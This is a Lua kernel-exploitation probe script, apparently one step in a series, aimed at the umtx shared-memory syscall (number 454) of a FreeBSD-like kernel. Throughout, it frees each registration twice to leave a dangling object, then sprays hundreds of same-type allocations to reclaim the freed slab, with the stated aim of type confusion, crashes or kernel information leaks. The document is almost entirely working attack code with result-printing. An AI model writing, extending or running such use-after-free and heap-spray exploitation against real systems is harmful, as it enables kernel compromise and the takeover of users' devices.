-- CRASH_CLASS: HIGH
-- PROBE 152g: Same-type slab reclaim — SHM-on-SHM confusion
--
-- Context: 152f showed GPU mmap can't observe kernel slab reclaim
-- (different allocators). Need same-type objects to reclaim.
--
-- Strategy:
-- 1. Create SHM with key K1 → allocates umtx_shm_reg
-- 2. Double-destroy K1 → struct freed but dangling in list
-- 3. Create MANY SHM with keys K2..K200 → some will reclaim K1's slab
-- 4. alive(K1) now reads from reclaimed slab → type confusion
-- 5. If alive(K1) returns different result or crashes → confirmed reclaim
--
-- If the freed reg's slab is reclaimed by another reg:
--   - The list pointers (uskr_list) now point at new reg's data
--   - alive() traverses list → follows corrupt pointer → crash/info leak

print("=== PROBE 152g: SAME-TYPE SLAB RECLAIM ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")
local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local sc_umtx = make_syscall(454)
local key = memory.alloc(0x20)

-- ============================================================
-- SECTION A: Baseline alive behavior
-- ============================================================
print("")
print("--- SECTION A: BASELINE ---")

-- Normal create/alive/destroy cycle
memory.write_qword(key, uint64(0xA0000001))
local ok1, r1 = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
end)
print("create: " .. (ok1 and to_num(r1) or "fail"))

local ok2, r2 = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
end)
print("alive_normal: " .. (ok2 and to_num(r2) or "fail"))

local ok3, r3 = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)
print("destroy: " .. (ok3 and to_num(r3) or "fail"))

local ok4, r4 = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
end)
print("alive_after_destroy: " .. (ok4 and to_num(r4) or "fail"))

-- ============================================================
-- SECTION B: Double-destroy then same-type reclaim
-- ============================================================
print("")
print("--- SECTION B: DOUBLE-DESTROY + RECLAIM ---")

-- Target key: will be double-destroyed
memory.write_qword(key, uint64(0xDEAD0001))
pcall(function()
    sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
end)
pcall(function()
    sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)
pcall(function()
    sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)

-- Check alive on the dangling key BEFORE reclaim spray
local ok_pre, r_pre = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
end)
print("alive_pre_spray: ok=" .. tostring(ok_pre) .. " ret=" .. (ok_pre and to_num(r_pre) or "crash"))

-- Now spray 200 SHM creates with different keys
-- These allocate new umtx_shm_reg structs from the SAME slab allocator
-- If the freed DEAD0001 struct gets reclaimed, its memory now holds
-- one of these new registrations
print("spraying 200 SHM registrations...")
local spray_ok = 0
for i = 1, 200 do
    memory.write_qword(key, uint64(0xBB000000 + i))
    local ok, ret = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    if ok and to_num(ret) == 0 then spray_ok = spray_ok + 1 end
end
print("spray_ok=" .. spray_ok .. "/200")

-- Check alive on the DEAD0001 key AFTER reclaim spray
-- If reclaimed: the list entry for DEAD0001 now overlaps with a new reg
-- The key comparison will fail (different key) but the list traversal
-- might crash or return unexpected results
memory.write_qword(key, uint64(0xDEAD0001))
local ok_post, r_post = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
end)
print("alive_post_spray: ok=" .. tostring(ok_post) .. " ret=" .. (ok_post and to_num(r_post) or "crash"))

-- Try destroy on the dangling DEAD0001 key
local ok_dd, r_dd = pcall(function()
    return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
end)
print("destroy_dangling: ok=" .. tostring(ok_dd) .. " ret=" .. (ok_dd and to_num(r_dd) or "crash"))

-- ============================================================
-- SECTION C: Multiple rounds with observation
-- ============================================================
print("")
print("--- SECTION C: MULTI-ROUND RECLAIM ---")

for round = 1, 5 do
    -- Create target
    memory.write_qword(key, uint64(0xCC000000 + round))
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)

    -- Double-destroy
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)

    -- Spray 100 SHM creates
    for i = 1, 100 do
        memory.write_qword(key, uint64(0xDD000000 + round * 1000 + i))
        pcall(function()
            sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
        end)
    end

    -- Check target key
    memory.write_qword(key, uint64(0xCC000000 + round))
    local ok_a, ra = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
    end)
    local ok_d, rd = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)

    print(string.format("round%d: alive=%s(%s) destroy=%s(%s)",
        round,
        tostring(ok_a), ok_a and to_num(ra) or "X",
        tostring(ok_d), ok_d and to_num(rd) or "X"))

    -- Clean up spray
    for i = 1, 100 do
        memory.write_qword(key, uint64(0xDD000000 + round * 1000 + i))
        pcall(function()
            sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
        end)
    end
end

-- ============================================================
-- SECTION D: Massive spray then probe — stress test
-- ============================================================
print("")
print("--- SECTION D: STRESS TEST ---")

-- Create and double-destroy 10 targets
local targets = {}
for i = 1, 10 do
    local tkey = 0xFACE0000 + i
    memory.write_qword(key, uint64(tkey))
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    targets[#targets + 1] = tkey
end
print("targets_created_and_dd=" .. #targets)

-- Massive spray: 500 SHM creates
local spray2_ok = 0
for i = 1, 500 do
    memory.write_qword(key, uint64(0xAB000000 + i))
    local ok, ret = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    if ok and to_num(ret) == 0 then spray2_ok = spray2_ok + 1 end
end
print("massive_spray=" .. spray2_ok .. "/500")

-- Probe all targets
local alive_count = 0
local crash_count = 0
for _, tkey in ipairs(targets) do
    memory.write_qword(key, uint64(tkey))
    local ok_a, ra = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
    end)
    if ok_a then
        local rv = to_num(ra)
        if rv == 0 then alive_count = alive_count + 1 end
        print(string.format("target 0x%X: alive=%d", tkey, rv))
    else
        crash_count = crash_count + 1
        print(string.format("target 0x%X: CRASH", tkey))
    end
end
print(string.format("alive=%d crash=%d total=%d", alive_count, crash_count, #targets))

-- Clean up massive spray
for i = 1, 500 do
    memory.write_qword(key, uint64(0xAB000000 + i))
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
end

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 152g COMPLETE ===")
